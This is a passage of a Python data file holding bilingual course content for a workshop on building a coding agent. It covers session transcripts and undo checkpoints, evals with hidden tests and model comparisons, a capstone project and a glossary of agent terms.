        goal=("Retomar sesiones y deshacer lo que hizo el agente sin depender de git.",
              "Resume sessions and undo what the agent did without relying on git."),
        concepts=(
            ["**Transcript JSONL append-only:** un mensaje por línea en `.forja/sessions/`. Reanudar, auditar y depurar. Tras compactar, una marca con el nuevo estado.",
             "**Checkpoints:** antes de que una tool modifique un fichero, se guarda su contenido original (o que no existía) — solo la primera vez por turno.",
             "**/undo:** restaura los ficheros del último turno con cambios. Funciona en carpetas sin git y no toca tus commits.",
             "**Límite:** los efectos de `bash` (instalar paquetes, borrar con `rm`) no se deshacen. Por eso bash pasa por permisos."],
            ["**Append-only JSONL transcript:** one message per line in `.forja/sessions/`. Resume, audit and debug. After compaction, a marker with the new state.",
             "**Checkpoints:** before a tool modifies a file, its original content (or that it didn't exist) is saved — only the first time per turn.",
             "**/undo:** restores the files from the last turn with changes. Works without git and doesn't touch your commits.",
             "**Limit:** `bash` side effects (installing packages, `rm`) can't be undone. That's why bash goes through permissions."]),
        todos=[("11.1", "session.py", "Transcript.append", "Transcript.append"),
               ("11.2", "session.py", "Transcript.load (con marcas de compactación)", "Transcript.load (with compaction markers)"),
               ("11.3", "session.py", "Checkpoints.before_write", "Checkpoints.before_write"),
               ("11.4", "session.py", "Checkpoints.undo", "Checkpoints.undo")],
        steps=("""python scripts/tasks.py test 11
forja --cwd playground --mode accept_edits
> cambia el vencimiento por defecto a 60 días
/undo
/sessions
forja --cwd playground --resume <id>""",
               """python scripts/tasks.py test 11
forja --cwd playground --mode accept_edits
> change the default due-date period to 60 days
/undo
/sessions
forja --cwd playground --resume <id>"""),
        checkpoint=("`/undo` deja el fichero como estaba y `--resume` continúa la conversación anterior.",
                    "`/undo` restores the file and `--resume` continues the previous conversation."),
        challenges=(["`/undo N` para deshacer varios turnos.", "`/rewind`: deshacer ficheros Y volver el historial al mismo punto."],
                    ["`/undo N` to undo several turns.", "`/rewind`: undo files AND roll history back to the same point."]),
        test="test_l11_sessions.py",
    ),
    dict(
        id="12", slug="evals", day=2, time="14:55–16:00",
        title=("Evals: medir tu agente", "Evals: measure your agent"),
        goal=("Comparar modelos y cambios del harness con tareas reales y comprobaciones objetivas.",
              "Compare models and harness changes with real tasks and objective checks."),
        concepts=(
            ["**Sin medir, todo es opinión.** ¿Es mejor `qwen3-coder:30b` que `qwen3:8b`? ¿Tu nuevo prompt ayuda? Se mide.",
             "**Tarea = prompt + comprobación objetiva** sobre una COPIA limpia del proyecto: tests (`command`), tests OCULTOS que se copian después (`hidden`, para que no haga trampa), contenido de la respuesta (`answer_contains`) y no modificar nada (`forbid_changes`).",
             "**Headless + bypass dentro de la copia:** el sandbox es la carpeta temporal.",
             "**Varias repeticiones:** los modelos no son deterministas. Mira pass rate, pasos, tiempo y tokens."],
            ["**Without measuring, it's all opinion.** Is `qwen3-coder:30b` better than `qwen3:8b`? Does your new prompt help? Measure it.",
             "**Task = prompt + objective check** on a CLEAN COPY of the project: tests (`command`), HIDDEN tests copied afterwards (`hidden`, so it can't cheat), answer content (`answer_contains`) and changing nothing (`forbid_changes`).",
             "**Headless + bypass inside the copy:** the sandbox is the temp folder.",
             "**Several repetitions:** models aren't deterministic. Look at pass rate, steps, time and tokens."]),
        todos=[("12.1", "evals.py", "grade: aplicar las comprobaciones", "grade: apply the checks"),
               ("12.2", "evals.py", "summarize: pass rate, por tarea, pasos, tiempo, tokens", "summarize: pass rate, per task, steps, time, tokens")],
        steps=("""python scripts/tasks.py test 12
python scripts/tasks.py evals --only fix_rounding
python scripts/tasks.py evals --repeat 3
python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3
python scripts/tasks.py evals --repeat 3 --config playground/.forja --label config   # con tus hooks, skills y subagentes""",
               """python scripts/tasks.py test 12
python scripts/tasks.py evals --only fix_rounding
python scripts/tasks.py evals --repeat 3
python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3
python scripts/tasks.py evals --repeat 3 --config playground/.forja --label config   # with your hooks, skills and subagents"""),
        checkpoint=("Tienes un informe en `out/` y puedes decir, con números, qué modelo usarías y para qué tareas.",
                    "You have a report in `out/` and can say, with numbers, which model you'd use for which tasks."),
        challenges=(["Añade una tarea propia a `evals/tasks.yaml`.", "Compara tu harness con y sin `todo_write` en el prompt base."],
                    ["Add your own task to `evals/tasks.yaml`.", "Compare your harness with and without `todo_write` in the base prompt."]),
        test="test_l12_evals.py",
    ),
]

CAPSTONE = dict(
    time="16:00–17:00",
    es="""## Proyecto final (día 2, 16:00–17:00): tu Forja

Personaliza tu agente para tu forma de trabajar y demuéstralo con números:

1. `~/.forja/AGENTS.md` con tus preferencias y un `AGENTS.md` para un repo real tuyo.
2. Una **skill** de tu equipo (convenciones, despliegue, revisión…).
3. Un **hook** que garantice algo que hoy pides por favor (tests, linter, secretos).
4. Un **subagente** especializado.
5. Una **tarea de eval** que represente tu trabajo diario, y el informe comparando dos modelos.

Demo de 3 minutos por persona o pareja: qué has añadido y qué ha cambiado en las evals.""",
    en="""## Final project (day 2, 16:00–17:00): your Forja

Customise your agent for the way you work and prove it with numbers:

1. `~/.forja/AGENTS.md` with your preferences and an `AGENTS.md` for a real repo of yours.
2. A **skill** from your team (conventions, deployment, review…).
3. A **hook** that guarantees something you currently ask for politely (tests, linter, secrets).
4. A specialised **subagent**.
5. An **eval task** representing your daily work, and the report comparing two models.

3-minute demo per person or pair: what you added and what changed in the evals.""",
)

GLOSSARY = [
    ("Agente", "Agent", "Modelo + tools + bucle que decide y actúa hasta terminar una tarea.", "Model + tools + loop that decides and acts until a task is done."),
    ("Harness", "Harness", "Todo lo que rodea al bucle: permisos, contexto, interfaz, hooks, sesiones.", "Everything around the loop: permissions, context, UI, hooks, sessions."),
    ("Tool call", "Tool call", "Petición estructurada (nombre + argumentos JSON) que el modelo hace al harness. El modelo no ejecuta nada.", "Structured request (name + JSON arguments) the model makes to the harness. The model executes nothing."),
    ("Streaming", "Streaming", "Recibir la respuesta en trozos según se genera.", "Receiving the response in pieces as it's generated."),
    ("Ventana de contexto", "Context window", "Máximo de tokens que el modelo ve a la vez.", "Maximum tokens the model sees at once."),
    ("Compactación", "Compaction", "Reducir el historial (vaciar salidas antiguas, resumir) para que quepa.", "Shrinking history (blanking old outputs, summarising) so it fits."),
    ("Modo plan", "Plan mode", "Modo de solo lectura en el que el agente propone un plan antes de actuar.", "Read-only mode where the agent proposes a plan before acting."),
    ("Subagente", "Subagent", "Agente lanzado por otro con contexto limpio y tools restringidas.", "Agent launched by another with a clean context and restricted tools."),
    ("Hook", "Hook", "Comando que el harness ejecuta en un punto fijo; puede bloquear (exit 2).", "Command the harness runs at a fixed point; can block (exit 2)."),
    ("Skill", "Skill", "Instrucciones que se cargan bajo demanda; en el prompt solo va su descripción.", "Instructions loaded on demand; only the description goes in the prompt."),
    ("MCP", "MCP", "Protocolo estándar para conectar herramientas externas a un agente.", "Standard protocol to connect external tools to an agent."),
    ("Eval", "Eval", "Tarea con comprobación objetiva para medir un agente o un modelo.", "Task with an objective check to measure an agent or a model."),
]
